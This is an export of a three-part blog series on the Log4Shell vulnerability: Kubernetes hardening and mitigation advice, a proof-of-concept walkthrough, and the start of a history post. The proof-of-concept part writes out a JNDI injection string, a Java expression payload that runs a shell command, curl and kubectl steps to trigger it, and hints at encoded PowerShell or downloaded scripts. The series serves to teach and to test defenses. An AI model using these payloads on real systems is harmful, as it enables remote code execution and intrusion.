[ { "title": "Log4j 2 vulnerabilities, part III: Prevention, mitigation and fixing", "url": "/blog/log4j-part-iii/", "categories": "Security", "tags": "CVE, Log4j, vulnerability, remote code execution, CVE-2021-44228, log4shell, cybersecurity, RCE, container image scanning, runtime security, mitigation, cloud, Kubernetes", "date": "2023-06-27 23:45:00 +0200", "snippet": "Wow, more than a year without writing anything more, and even leaving a three-part blog post unfinished… So what happened?Well, I started a new job, which requires a lot of focus as the beginning is crucial. All the time I had for starting the blog and writing the first articles was indeed because I already had left the old one and was waiting for the new job.A year of many interesting things has passed, and many times I had the desire to write about several different things. But having first to finish the trilogy prevented me to tell what I wanted to tell at that particular time. Then this major vulnerability has become water in the river and people seem to not care so much anymore.So I’ve decided I will at least create an abstract theoretical post to close the topic. That way I can continue writing about other things.Ok, so if you are here is because you are interested in the Log4j 2 vulnerability, at least from a historical standpoint, and as a way to apply “lessons learned” to your current process.To learn more about Log4j and vulnerabilities, don’t forget to visit also my other posts: Part I: History Part II: Kubernetes POC Part III: Prevention, mitigation, and fixing (this post)The two big questions that I will answer in this post are: How could this be prevented or mitigated? How should you proceed once a situation like this is detected?I’ll set up problems in a generic way, but focus on Kubernetes for specific examples.1. Prevention and mitigationA zero-day like this vulnerability, by definition, can’t be detected in advance. So it’s impossible to know it’s there. But some things can be done to detect their behavior and contain their reach, like: Avoid cluster misconfiguration Less and better dependencies Runtime detection Network segmentation Encrypting network traffic Process containmentAvoid starting with a vulnerable cloud or cluster setupMisconfiguration in your infrastructure for how you are provisioning cloud resources or how you are configuring a cluster is the number one reason for breaches. Check you employ known best practices for your cloud provider. Remember misconfiguration on infrastructure or cloud usage is not in the scope of vulnerability databases, it’s completely on you. You can download Center for Internet Security (CIS) Benchmarks with security recommendations for AWS, GCP, Azure, Kubernetes, Openshift, and many other platforms, and use automated tools for checking like Kubebench, or Prowler. You can also check IaC (Infrastructure as Code) with tools like Checkov for bad practices that make you vulnerable.Vulnerability databases only cover “software that you install”, for problems people report. But there are also cloud vulnerability databases like secwiki.cloud (cloud vulnerability wiki), and cloudvulndb.org.Less and better dependenciesAlthough we will speak about a lot of security concerns, the focus in this post is vulnerabilities. They can live in your software, on libraries and external dependencies you use, and you may not know it. One way of reducing risk is… running less software!Specifically for container images, you should wisely choose your base images so they have the least packages possible, and those that have to be there to be very carefully chosen. A good starting point is using distroless container images and statically compiling your software. If that is not possible, consider not all base images are the same. Try to start with a small Alpine or Debian-slim. If you don’t want to craft all dependencies inside the image yourself, consider the ones from Bitnami are sometimes better (less unnecessary dependencies and vulnerabilities) than the official images from open-source projects. Other alternatives like Chainguard have an enticing promise of zero vulnerabilities in their images that is worth putting to the test.Also the quality of your dependencies is important, you should choose carefully which dependencies written by other people you execute alongside your software. Make sure they come from reputable sources, open-source projects with many maintainers that regularly release new versions and fix issues. That will reduce the amount of vulnerability they have, and the time for a new one to be addressed.When you reference base container image, and you build your own, make sure you always pin the tag version of the image, or even better, reference the SHA-256 digest that will prevent a mutated tag (different image with the same tag) to be used. Reproducible builds are important for security, accountability and troubleshooting.Frequent and quick updatesIf you update your software dependencies frequently you may avoid altogether vulnerabilities; or if a vulnerability has already been discovered in software that you use, if you can replace it very quickly you can skip being impacted by it. The key is having an automated way to build new versions of container images, check their vulnerabilities (more on this later), test and deploy them in a controlled manner, and automatically monitor the new deployments to check if it works well.You can automate container image build using automated build systems from your cloud provider (AWS, GCP, Azure), or using open-source tools that run in your own cluster like ArgoCD or Tekton.Automated deployment strategies that checks if everything went well, and automatically roll back otherwise, include canary deployemnts](https://learn.microsoft.com/en-us/azure/devops/pipelines/ecosystems/kubernetes/canary-demo?view=azure-devops&amp;amp;tabs=yaml) and blue-green rolling update deployments. For this to succeed, you must implement good readiness and liveness probes in your pods.Runtime detectionEven if you don’t know about a vulnerability, you can use runtime detection to examine the behavior of compute elements looking for suspicious activity. A tool like open-source Falco can be installed as an eBPF or Kernel module for hosts, containers, or Kubernetes. It has an extensive set of more than 80 curated rules that would detect undesirable activity once someone is exploiting a zero-day, like running an interactive shell, searching for passwords or certificates, exfiltrating them, or trying to break security boundaries. Alternatives like Tetragon looks interesting, leveraging just eBPF, but you lack any starting point for security rules and have to write everything from scratch. It has a great capability of being able to stop a process just after a detection, but it has been disclaimed this is as useful as it sounds.Network segmentationWhen you initially set up your Kubernetes container, it’s easy for learning purposes that every pod is exposed directly to the Internet, including the control plane API. This is also a very insecure situation that would be an important thing to address related to the misconfigurations we mentioned at the beginning of this post. Ensure you are running the cluster network layout is private and traffic has to come from and to the cluster using a gateway that you can configure so only your sanctioned load balancers make access to destination pods that you have specified as frontend services.Once inside your cluster, by default, every pod can network connect to any other one. If you leave that this way, when one is compromised it’s possible to connect to any other one. This is what we described in my Log4j vulnerability post that was happening on several compromised services, including Apple iPhone naming server](/blog/log4j-part-i/). To limit that, in Kubernetes, you can use Kubernetes Network Policies (KNP) to easily set how pods can talk to each other. Remember that KNPs are “additive”, the first time you specify one, everything gets blocked except the kind of communication you describe; and when you include more and more KNPs, more things get allowed as the union of all policies (its impossible to “disallow” something already allowed). Also, remember that ingress and egress sections are completely different policies, so if you specify in policies rules for ingress, but you don’t include any egress section on them, that doesn’t mean you are blocking egress traffic, but that you still are allowing everything. To completely disallow one of those kinds of traffic, you have to include in at least one policy the corresponding section (“egress:” or “ingress:”) with zero rules.Depending on the Container Network Interface (CNI) of the dataplane your Kubernetes cluster uses, you may need to activate network policies, or do additional installations, to have access to that feature; even replacing the CNI for Calico or Cilium, both of them having their own proprietary more powerful network policies. Remember that you can replace the CNI of worker nodes, but not for control plane ones that will remain under the original CNI with their own IP range, that will not know anything about pods range. If that is the case, you will need for example to run on “host network” pods with webhooks that have to be called from the Kubernetes API (but not the other way around). And pods on the host network share the IP address and network interface of the host, which at the same time can’t be controlled with normal Kubernetes Network policies.Kubernetes Network Policies work very well to manage pod traffic inside the cluster on regular pods. But if you want to filter external traffic, when using load balancers the external source IP address of the connection may be masked. To avoid this, you can opt to lose perfect balancing vs preserving client ip by setting externalTrafficPolicy to local. It’s a good idea to use a cloud firewall when possible for rules that can apply in this case.Encrypting network trafficTraffic encryption will prevent any middleman in your infrastructure can listen to your communications; may it be your cloud provider, your own software, or a malicious actor that has found a vulnerability in one of your systems and wants to gather information on different ones.A service mesh is an interesting addition that brings your cluster network better observability, better load balancing, and automated mTLS authentication and encryption. But it’s not enough for network segmentation: if it’s based on sidecars like Istio it will only proxy L7 traffic, not blocking direct ip:port communications and the proxy can be bypassed if the pod has enough privileges; and if it’s eBPF based, which can route L3 traffic, it completely lacks any network segmentation features, leaving that control to its underlying eBPF CNI and the previously discussed network policies.If you don’t want the overhead resource cost of a service mesh, and you want end-to-end encryption (from client to pod), research how your load balancers can do SSL pasthrough to make that possible. On AWS, (Application Load Balancer (ALB)](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/introduction.html) can’t do SSL passthrough. You could use Network Load Balancer (NLB) in tcp mode, but if you use AWS Load Balancer controller, you will need an NLB per service, which is costly, and will exhaust available VPC ip addresses. You could provision NLB using Terraform or CloudFormation and use different ports to different services, or create a single NLB and Nginx ingress controller.Process containmentA computer CPU runs software in a process, many of them at the same time for parallelism. A service may run in a container, which is just a process with some isolation from other processes in the same host machine, and its own network layer.When running containers, if the vulnerable workload gets compromised, there is already some isolation from the host that is running it, may it be on a Kubernetes cluster, or other kind of orchestrator. But if the malicious agent knows a way to escape the confinements of the container via a vulnerability in the orchestrator, which has happened in the past, he could switch to run on the host virtual machine directly. Several privileged settings for pods will enable them to run very privileged capabilities, that when it gets compromised, makes escaping the container and gaining root privileges on the host machine extremely easy. From there, the malicious agent will be able to do a lot of harm.To prevent pods in a Kubernetes cluster from having insecure settings you can use Pod Security Standards, where you can set a namespace at three different levels: Privileged: anything is allowed Baseline: any setting that will make a direct compromise of hosts is disallowed, like privileged containers or host network. Restricted: containers need to run as non-root, drop almost all Linux capabilities, and specify a seccomp profile that filters system calls.So in summary, a baseline pod may just be any regular plain pod spec YAML if it doesn’t include any special security setting in it. A restricted pod needs to have added to its securityContext these settings:securityContext: allowPrivilegeEscalation: false capabilities: drop: [&quot;ALL&quot;] add: [&quot;NET_BIND_SERVICE&quot;] # Optional, the only allowed value runAsNonRoot: true runAsUser: 10000 # Optional, must not be 0 seccompProfile: type: RuntimeDefault # or &quot;Localhost&quot;Remember Kubernetes namespaces do not limit anything at all until you put extra limiting settings on how they behave. Don’t worry if at first, you don’t understand the implications of all these. You can start with setting baseline, as it will require mostly you to do nothing to your pod specs, otherwise you’ll know they are already insecure.The reason to drop all capabilities is that some of them are dangerous, for example you can use CAP_NET_RAW, that is allowed by legacy reasons, to craft false IGMP packets on the node and trick other pods to use yours as a DNS proxy, intercepting traffic. NET_BIND_SERVICE is allowed in case you need to expose ports lower than 1024.A side effect of restricted pod settings is that you can’t share the pod process namespace, so troubleshooting with kubectl debug and ephemeral containers will not be able to access the target pod process, which severely hinders its usefulness as a debug tool.If you want to do some static analysis of your pods’ YAML PSS posture, for example for third-party Helm charts, You can use my own psa-checker open-source tool to evaluate to which PSS level the pods a chart will deploy comply with. You can also shift left and put it into a pipeline to fail early if it sees pods of the wrong level.When you need a more fine-tuned permissions system that is not just those three levels, or enforce additional restrictions not included in them, you can install an admission controller like Gatekeeper or Kyberno, and write your own policies for them using OPA for the first or plain YAML for the second. For example, you could write rules to prevent container images that use the latest or no tag at all (something mentioned earlier here), that don’t specify resource quotas or limits (that I will talk about a little at the end of this post), or that don’t come from your sanctioned container registry.In general an important thing you can do to improve your containers security is to make sure they do not run as root user. You can specify in the Dockerfile with USER a different user, or at least make sure that they are compatible with running the as non-root. Then on the pod spec, use runAsUser to specify a userId. That way, what a malicious actor can do inside the container will be limited to its own linux user permissions, which may not be so limiting inside its own container, but will seriously prevent spread if the container isolation is breached and the process escapes to the underlying host.Kubernetes RBACWhen thinking of cluster orchestration for a single containerized workload, or even complex microservice architectures, is that those workloads just need to declare what they need and let the orchestrator carry the work of making it possible. But some of the cloud-native applications you can run in the cluster are to extend how the orchestrator work or your workload is complex enough to need to be aware and interact with the orchestrator. This is where Kubernetes Role Based Access Control (RBAC) comes into play to give some permissions, but not all.As always, you should give the least permissions possible to do the job intended. Leverage roles, rolebindings, clusterrole, clustesrrolebindings, service accounts, users and groups. Remember namespaces do not limit anything at all until you put extra limiting settings on how they behave. Learn how to master this, including using subresources permissions, like pod/exec or pod/logs, and indicating specific resource names, like to which specific deployment you are giving permissions. Avoid using * (everything) anywhere, and remember that Kubernetes accepts anything for RBAC, even if the kinds have typos and do not exist… at the moment you are deploying the RBAC rules.Some permissions require special consideration. Giving read secrets permission will allow getting tokens that can be used to authenticate to other services, facilitating lateral movement. Note there is no distinction between list secrets_ and read secrets, it’s the same permission, and even if with kubectl there is a difference, if you just directly use curl there is none. Modifying any event will allow someone to tamper with information that may be important to detect a malicious attack. Also important is pod/_exec, which would allow someone to execute a shell into containers, with the potential to insert their own malicious code, exfiltrate secret information, etc.Every namespace has a default service account that is assigned to each pod if in their spec there is none specific, with a token to auth to the Kubernetes API that has very few permissions, just to “ask” what it can do (that will be nothing). It’s a good idea to opt out of automounting this token on all pods, as if not specifically required, pods should not even be able to talk with that API, to begin with; think that if they get compromised it can be the starting point of exploiting some Kubernetes API vulnerability. Also, someone may have the disastrous idea of starting giving permissions to that default account, which will unknownlying give those permissions to all existing and future pods created on the namespace, with unintended side effects.Kubernetes RBAC system will not allow a user (or service account) to create a rolebinding that would give to itself or others more permissions than they currently have, which is nice to let less permissioned users create their own even least permissioned RBAC rules. But take into consideration that if you have permissions to create a pod, deployment, daemonset, job, or cronjob, in some namespace, and there is another service account in that namespace, you can create a workload tied to such service account, with the command of your choosing, triggering a de-facto privilege escalation.Cloud providers have ways of tying cloud IAM identities with Kubernetes users and groups. Make sure you are using this the right way, usually having a role tied to a group that can be delegated to other IAM users is a common practice, configured in a configmap on the cluster. But that may make it difficult to understand when looking at logs exactly which user executed which command.When deploying third-party workloads, like helm charts or operators, review the RBAC permissions they include, and seek alternatives if they just deploy a Clusterrole with all permissions on the cluster, as it will be a big security risk. As explained before you can psa-checker to evaluate PSS level of pods in a Helm chart. This will no tell you info about the chart RBAC rules that you have to investigate yourself, but at least will tell you if the pods already are restricted to insecure process containment. And you can use the open-source tool bad robot to evaluate the security posture of operators, including their RBAC rules.2. Detection and fixThe only way to detect if you are using a vulnerable dependency in your projects is if that vulnerability is already known. People report vulnerabilities to Mitre CVE which will just assign a CVE number, and to Nist NVD database with score vector and extended info. That is the one you want to mainly query, but there more databases you can consider like osv.dev, GitHub advisory database, or Go Vulnerability Database. There are Linux distribution specific databases (Debian, Red Hat, SUSE, Ubuntu), and privative ones like VulnDB, but you may see a lot of repeated info also reported to NVD anyways.But you shouldn’t be manually reading every single day vulnerability databases on your own. You can use a container image scanning tool to list all known dependencies on your containers and match that list with the NVD or other vulnerability database. Some open-source scanners for command line are Trivy, Grype, Snyk; and free tool Docker Scout. The first time you do this, you will be surprised to learn how many vulnerabilities are out there, so you better filter for the high or critical ones that have a known exploit.Remember the sooner you scan the better, developers when test-building images, on build pipelines so very vulnerable images are stopped, and when publishing to a container registry. But even after your container image has long been built, new vulnerabilities may be discovered. Then you want to continually scan existing container images on registries as well as on running hosts and clusters. Most scan solutions in this latter case rely on having an SBOM (Software Bill of Materials), a list of all known software on the image, as the list shouldn’t change, so they can continuously keep matching the SBOM list to updates of the vulnerability database to warn on newly discovered vulnerabilities. You shouldn’t have to bother how SBOMs work at all, an enterprise solution like Sysdig, Aqua, Prisma, Lacework, or Snyk should take care of that. You just have to set up scanning at every step, establish acceptance criteria, and centralize reporting of findings.The first time you are warned of an important vulnerability (high or critical with known exploits, for example), two things can happen: You are using the vulnerable dependency for the first time You already were using the vulnerable dependencyUsing vulnerable dependency for the first timeYou are just using that dependency with the vulnerability for the first time. You should research if it has been recently discovered, and if you can use an alternate (older) version that is less vulnerable until the newer one gets fixed. If the package is in general in a very bad situation vulnerability-wise on all versions, consider using a completely different dependency that can do the same job.You already were using the vulnerable dependencyIf you already were using the vulnerable dependency. Then other possible options arise. There is an upgraded version that is known to fix the vulnerability (it would be indicated in the vulnerability database). Then just rebuild the container image using this version, following all the test processes that you should have in place to make sure everything works as expected. In this process, you may want to also upgrade other dependencies, but be careful. If you change a lot of packages, you may also be introducing new vulnerabilities to consider, or your tests may show that your software no longer behaves the way it should. To be able to do this in a controlled manner, it’s important to version-fix the dependencies in your build process, so it’s easier for you to choose what to upgrade, and maybe even to have your own copy of the original dependencies you use, in your own controller artifact registry (like Artifactory, GitHub Actions Artifacts, AWS Artifact Repository, Azure Artifact), Google Artifact Registry. It is also useful to separate the build process by creating or using a base container image that is reliable and you trust, and on a separate step additional layer(s) for the very specific software of that container, that way it’s easier to keep the base consistent if you don’t need to change its packages. Reproducibility is a very important concept for security and stability. Also automating rolling out new releases will reduce the time it takes you from detection to complete vulnerability removal of your production workloads. There is no upgrade version that fixes the vulnerability, or the alternative is a different mayor (or minor) version that breaks some functionality. In this case, again you have two options. You think you need to remove the vulnerable dependency no matter how. You should then replace it with a very different version, or even a different dependency that provides a similar set of features. This can be arduous and coding-intensive, where having good tests is essential. Also good planning in separating in-layer functionality instead of calling directly the dependency will help replace it. Balance is the key, you can’t make everything abstract or code will be very convoluted even for simple things (I’m looking at you, enterprise Java). The vulnerability doesn’t look so serious, or you think known mitigations may be put in place to prevent it from being “activated” or “reached”. To arrive at this conclusion, study the Common Vulnerability Scoring System (CVSS) vector that describes its behavior, the global score, and if there is a known exploit link in the CVE information page. In this scenario, you have the advantage of the vulnerability already being known and researched. If it relies on some specific network connection or unfiltered input, you may add some network filter with specific blocking rules (like Snort) or a security web proxy (like OWASP ZAP). You may not need to write your own rules, but keep an eye on runtime behavior and seek updated rules if the vulnerability is further analyzed to be activated in new ways. 3. That’s (not) all folksNo, no… that is not all. This is enough for vulnerabilities in containers, but there are still general recommendations to follow: Your own coded software may have insecure code practices. Ensure you define a good architecture and use some code quality analysis tools like SonarQube. Managing secrets and certificates, who creates them, how to deliver them to your workloads in a secure way, how to revoke and rotate tokens, etc, would also deserve its own blog post. Never allow any kind of secret token or file in your Dockerfile or container content. Kubernetes secrets have been criticized for initial lack of strong security like not keeping them in memory instead of disk, not using encryption at rest, loading them only to nodes that didn’t need them, and poor document explanation of how they are secure. Those days are over, but Kubernetes secrets is just a delivery mechanism, you still have a source to store, manage, deliver them to your cluster, and update and revoke secrets and certificates. There is where open-source tools like Vault or Cert Manager can help you. Also, Cloud providers have specific services that you can leverage (AWS, GCP, Azure), but with vendor lock-in. You can set your secrets to be mounted as environment variables, or files, which is preferable. Anyone that can list processes on the host would be able to see all environment variables (and secrets) of a those processes. But when they are mounted as files, they use an in-memory filesystem volume so they are never persisted on disk, and getting to that volume is harder in case a malicious actor tries to exfiltrate secrets. Your workloads unchecked could exhaust the resources of the cluster, which may be triggered during a denial of service attack for a single service, but results in the whole cluster going down. What is worse, they could prevent security software on the cluster from running. Learn to use and enforce setting resource requests and limits and limits to avoid that. But be careful, a CPU limit on your workloads will make them get throttled when reaching the maximum allocated, but for memory, Kubernetes will repeatedly kill the offending pods with OOMKilled status (OOM = Out Of Memory). Some people say it’s better not to use limits, in any case, it’s a very tricky thing to set properly, which relates to the next point. Observability is heavily related to security. If you see a sudden increase in CPU activity, a cryptominer may have started running in your hosts. If the network activity is the one going up, data exfiltration may be happening, or your cluster may start to be used for a denial of service attack. And sudden increased disk activity may be a ransomware attack going through files and encrypting them. The most recognized open-source tools for that are Prometheus for scraping, storing, and querying time series metrics, Alertmanager for triggering alerts based on your metric rules written in PromQL language, and Grafana for displaying dashboards. Install all at the same time using this helm chart. You can complement that with Robusta, also open-source, to make sure the information for troubleshooting incidents easily arrives to developers. When handling many cloud accounts, each possibly with many clusters can be a real challenge that requires enterprise tools. In this case, Sysdig is exceptional as it not only is a top-tier observability tool, but also a top-tier security one all in the same product. For specific files, you can query APIs to know if they have been tampered with extra malicious code, like VirusTotal API or CIRCL hashlookup. You can also use open-source ClamAV to check for malware files, something no vulnerability scanner does, but bear in mind it’s very rare to find any at all on container images (maybe on Windows images?). In any case, don’t blindly trust vulnerability databases, even for things that are reported on NVD, there are important claims of inaccuracy, and if you are trying to report a CVE for a software vendor that is a Certified Numbering Authority (they can assign CVE ids), like it’s the case for Microsoft: [they may argue or ignore you preventing the report to move forward](https://www.pluginvulnerabilities.com/2023/01/09/cves-process-for-disputing-a-claimed-vulnerability-is-currently-broken/. When your focus is on a secure software supply chain, you want to make sure you have under control all code that gets executed into your cluster. From the dependencies your developers are using, how containers are built, and making sure what you are running is the same thing you built in the first place. On top of vulnerability scans to evaluate dependencies as explained, you may want to sign your container images using cosign for keyless signing, and push the signature to your registry, so it can be verified later before deploying it. That is just the first step in **zero-trust security architecture. You can leverage the SLSA standard that defines additional levels to secure the attestation and provenance of how your software is built and used. But how do you trust that your provisioned infrastructure and cloud components are who they say they are for this interaction? To solve that, you can look into SPIFFE (Secure Production Identity Framework for Everyone) standard and the implementation provided by SPIRE (SPIFFE Runtime Environment). If you want a thicker isolating layer for your containers, you can try to run them using gvisor as an extra layer between them and the kernel, but beware that not all containers are compatible with it, as it will only allow a subset of system calls. Another isolating mechanism you can try is [kata containers, which will execute each one on its own virtual machine, but with an important performance hit. Lastly, if you want paramount isolation where not even the orchestrator or a cloud provider can know what is running in your cluster, look for confidential containers. ThanksThanks to Flaquivurus for the cover photo.ConclusionSorry for taking so long on completing this post series. I was busy with my new job, and as I already are speaking daily about cloud, container and Kubernetes security full time, I wanted to write about other topics. But it was important to first close this chapter. I have the feeling that I will write less about security in following posts.Vulnerabilities are a reality that you will face, so you better plan for that in your software project. Be it dealing with unknown ones, mitigating what is known but can’t be fixed, or making things easier to upgrade, test and roll out.If there is some information I missed in this article, or you just want to chat with me, let me know.And if you found this information extremely useful to you, why not let others know? Share it in a tweet, or invite me to coffee!Vicente Herrera is a software engineer working on cloud native cybersecurity (cloud, containers, Kubernetes).His latest job is cybersecurity specialist at Control Plane, and previously was Product Manager at Sysdig.He is the published author of Building Intelligent Cloud Application (O’Reilly, 2019) about using serverless and machine learning services with Azure.He has been involved in several research projects for using AI on healthcare and automatic code generation." }, { "title": "Log4j 2 vulnerabilities, part II: Kubernetes POC", "url": "/blog/log4j-part-ii/", "categories": "Security", "tags": "CVE, Log4j, vulnerability, remote code execution, JNDI, CVE-2021-44228, CVE‑2015‑4902, CVE‑2015‑4902, log4shell, RCE, proof of concept, security, cybersecurity, Kubernetes", "date": "2022-02-01 22:25:00 +0100", "snippet": "Sorry, I couldn’t resist using a photo of a masked man operating in the dark several computers while standing up. It won’t happen again.In this second post about the Log4j 2 vulnerabilities, I will describe technical details of the remote code execution, as well as present a proof of concept using Kubernetes that is very easy to deploy, safe to run in a test environment, and very useful to test security tools, fixes, and mitigations.To learn more about Log4j and vulnerabilities, don’t forget to visit also my other posts: Part I: History Part II: Kubernetes POC (this post) Part III: Prevention, mitigation, and fixingHow does the exploit workIt requires the combination of an old vulnerability/misconfiguration not patched in Java for JNDI, and another old but recently discovered one in Log4J 2.The Java Naming and Directory Interface (JNDI) is an API that allows you to interface with several naming and directory services, like Lightweight Directory Access Protocol (LDAP) or Remote Method Invocation (RMI), to look up data and resources.For example, using the JNDI string ldap://malicious.com/object we are looking into the malicious.com domain using the LDAP protocol for information on the resource named “object”.The Log4j 2 library includes the ability to execute lookups, as a way to add values at arbitrary places, using a plugging that implements the StrLookup interface. For JNDI, those lookups were enabled by default until version 2.17. When you log a string that contains a dollar sign followed by brackets, what is inside of that will get resolved using JNDI. For example:log.info(&quot;${ldap://malicious.com/a}&quot;)The problem comes when you log information that comes from a user, they may include that string crafted in a way to trigger the server to execute the lookup call if you don’t sanitize it. It can be as simple as including the lookup string in the URL or user-agent field of a browser or a CURL call. But not only that, anything that would be logged by a server can be used to inject the lookup string, like the text you are sending in a chat, or even by setting it as the name of an iPhone device.Log4j 2 vulnerability exploitation sequenceOne of the data types that can be returned on LDAP or RMI call is a URI pointing to a Java class. If the class is unknown on the local Java execution context, you can specify in the javaFactory field a deserialization factory class that has to exist on the attacked server, implements javax.naming.spi.ObjectFactory and have at least a getObjectInstance method.So for a successful attack, you can use the javax.el.ELProcessor class that has an eval method that you force to be executed on deserialization, relying for example on the org.apache.naming.factory.BeanFactory factory class to create and execute it. See additional details in this article. Different base Java environments (Tomcat, Websphere, etc) may use a different existing factory class to succeed. Then, the code to be executed that give us ultimate remote code execution can be something like this:// Malicious expression on code deserialization for arbitrary code execution {&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;/bin/sh&#39;,&#39;-c&#39;,&#39;touch /root/test.txt&#39;]).start()&quot;)}Oracle included in the past improvements on Java to try to fix the JNDI vulnerability that were not succesfull:📅2015-10-21: CVE‑2015‑4902 published without specific details.📅2016-08-03: BlackHat USA 2016 presentation showcasing JNDI injection Remote Code Execution for the previous CVE.📅2017-01-17: Oracle updates Java to 8u121. Adds codebase restrictions to RMI, where classFactoryLocation is not used for deserialization. LDAP is still vulnerable, and javaFactory is still usable to use for RCE. 📅2018-10-16: Oracle updates Java to 8u191. Same classFactoryLocation restriction added also to LDAP. javaFactory is still usable to use for RCE on both RMI and LDAP to this day.Read the full Log4j vulnerability history on the previous article “Log4j part I: History”.Kubernetes Proof of ConceptToday several proofs of concept have been created for the Log4j 2 vulnerability, as well as for setting up a malicious LDAP server. I have combined two very interesting ones to create my own version that runs on Kubernetes, that we can use to do additional test on (see part III of this article series).https://github.com/vicenteherrera/log4shell-kubernetesYou can test this yourself using your preferred Kubernetes service on the cloud, online using a free Okteto account, or locally (using Minikube, Kind, etc). Even if you are not very interested in using Kubernetes to test this, this procedure is very simple to run.As an example, let’s start Minikube to use as target cluster:minikube startTo deploy the vulnerable Log4j 2 application, and the malicious LDAP server, you don’t even have to clone or download the repository or build container images, just execute the following in your test cluster.kubectl apply -f https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/vulnerable-log4j.yamlkubectl apply -f https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/rogue-jndi.yamlThis will deploy for Kubernetes objects: vulnerable-log4j service, that exposes vulnerable-log4j-app deployment, that deploys a pod running quay.io/vicenteherrera/log4shell-vulnerable-app container image. rogue-jndi service, that exposes rogue-jndi-app deployment, that deploys a pod running quay.io/vicenteherrera/rogue-jndi container image.Everything will be deployed to the current namespace, and as we are not attaching any ingress or load balancer. A more realistic scenario would be to deploy only the vulnerable application on the cluster, expose it to the internet, and deploy a different server for the rogue JNDI server and starter attack. But this way the workloads will not be exposed to the global Internet, and the execution of the attack will not be any different.You can check the logs of each service to monitor what’s happening with them:# run on different terminalskubectl logs service/rogue-jndi -fkubectl logs service/vulnerable-log4j -fLooking at the rogue-jndi service log, we see it tells us that to execute the remote code in Tomcat, we should use the string ${jndi:ldap://rogue-jndi:1389/o=tomcat}.To have Log4j 2 log that string, you can use a disposable pod to run on the same cluster. From it you can send a CURL request to the vulnerable service with a X-Api-Version parameter of the header of the call that includes the string. The vulnerable application will try to store it in its log, and the remote code execution will be triggered.To do this, we again deploy to the same namespace a pod with CURL and shell access. This way we are triggering the attack without having to expose everything to all Internet as explained before, and the only difference would be the URL to use for a realistic attack would be the one for the public IP address of the service.kubectl run my-shell --rm -it --image curlimages/curl -- shcurl vulnerable-log4j:8080 -H &#39;X-Api-Version: ${jndi:ldap://rogue-jndi:1389/o=tomcat}&#39;The rogue-jndi service Dockerfile container image definition includes in the CMD procedure the remote code to be executed when it triggers its upload. It’s a simple command to write to a /root/test.txt file.To validate the attack was successful, let’s check what is in the /root/ directory of the vulnerable application:kubectl exec service/vulnerable-log4j -it -- cat /root/test.txtYou should see the file exists and include the date and time of each time you have triggered the attack.POC considerationsFor the vulnerable app, after testing several options I’ve chosen github.com/christophetd/log4shell-vulnerable-app because it includes Gradle for dependency management and you can build your own container image with the provided Dockerfile. Other repositories only included the compressed .war file, claiming to use a pom.xml for maven that can’t be used to rebuild the war because old dependencies not being available (they may have used a local cache of them). Others just include the container files without all the files required for building the application. The chosen POC is better because we can make modifications to the source code, the Java configuration, or the base Java container image to test the efect on the vulnerability.For the malicious JNDI server, I’ve chosen github.com/veracode-research/rogue-jndi. It allows you to respond with different attack strings for different Java application servers using the same single port. Another nice alternative is github.com/welk1n/JNDI-Injection-Exploit.Rogue-jndi lacked a Dockerfile to deploy using a container, so I provide one that just creates a /root/test.txt file on the compromised workload on a successful attack. You can modify it to do different scenarios. But I warn you, you can’t use &amp;amp;&amp;amp;, ;, | or other ways of chaining different command as it has been built. When interpreting the string, it will be treated as a single command with everything else as parameters for it. Go figure, a vulnerability exploitation example that takes very seriously string sanitization of its parameters. For compromising Windows that is not a problem, a single powershell.exe -encodedCommand &amp;lt;base64 string&amp;gt; will execute anything. For Linux, you can hardcode other command executions directly on the rogue-jndi source code instead of relying on what is passed as a parameter when it starts. Or just modify the code and send different URLs with CURL for different commands to execute. There are several ways to succeed in executing a wget or curl to download a bash script, and then execute it in a second command.ThanksThanks to Brian Klug for the original featured image: Title: Anonymous Hacker Author: Brian Klug URL: flickr.com/photos/brianklug/6870002408/ License: Attribution-NonCommercial 2.0 Generic (CC BY-NC 2.0) Modifications made: Added sticker “My other computer is your Log4j server” to laptop cover.ConclusionJNDI used for remote code execution is an old story that hasn’t been patched in a long time. Log4j 2 failing to sanitize strings is vulnerable to this kind of attack. Using the GitHub repository I’ve created, you can in very few steps reproduce the attack to experiment and test security tools.Read more about History of Log4j vulnerabilities and JNDI on “Part I: History” of this article series. Be ready for part III, where we evaluate and put to the test fixes and mitigations, which work, which doesn’t.If there is some information I missed in this article, or you just want to chat with me, let me know.And if you found this information extremely useful to you, why not let others know? Share it in a tweet, or invite me to coffee!Vicente Herrera is a software engineer working on cloud native cybersecurity (cloud, containers, Kubernetes).His latest job is cybersecurity specialist at Control Plane, and previously was Product Manager at Sysdig.He is the published author of Building Intelligent Cloud Application (O’Reilly, 2019) about using serverless and machine learning services with Azure.He has been involved in several research projects for using AI on healthcare and automatic code generation." }, { "title": "Log4j 2 vulnerabilities, part I: History", "url": "/blog/log4j-part-i/", "categories": "Security", "tags": "CVE, Log4j, H2, Logback, vulnerability, remote code execution, JNDI, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832, CVE-2021-42392, CVE-2021-4104, CVE-2021-42550, CVE‑2015‑4902, log4shell, RCE, report, history, security, cybersecurity", "date": "2021-12-17 17:30:00 +0100", "snippet": "On the 9th of December 2021, a critical update because a vulnerability was published for the popular open source Log4j 2 library. The next day it was classified as CVE‑2021‑44228. Some people started calling it “log4shell”, as it allowed very easily to do a remote code execution attack. Days later several new vulnerability reports and patches would be published for this and related projects.The implications are so huge that I had to break this article into several parts. In this first one, I’ll center on my personal investigation of the history of the library, its vulnerabilities, software vendor response, and who are its maintainers (support them!).To learn more about Log4j and vulnerabilities, don’t forget to visit also my other posts: Part I: History (this post) Part II: Kubernetes POC Part III: Prevention, mitigation, and fixingIn this post I explain in my own words how the vulnerability works, and presents details of a Kubernetes proof of concept created by me. On a third part (work in progress), I will analyze security measures, fixes and mitigations. If you are worried about your services in production, stop reading here and update all libraries in your code, the third-party software you use, and ensure your cloud services has not been compromised.What is Log4j 2?Apache Log4j 2 is a very popular open source Java library used to manage logging messages.It is included in several frameworks like Apache Druid, Apache Flink, Apache Solr, Apache Spark, Apache Struts 2, and Apache Tomcat (although that doesn’t mean directly that they are vulnerable, read more about this in part II).The extent of use of this library was so huge that a whole snowball of updates and patches took over the Internet.Same day 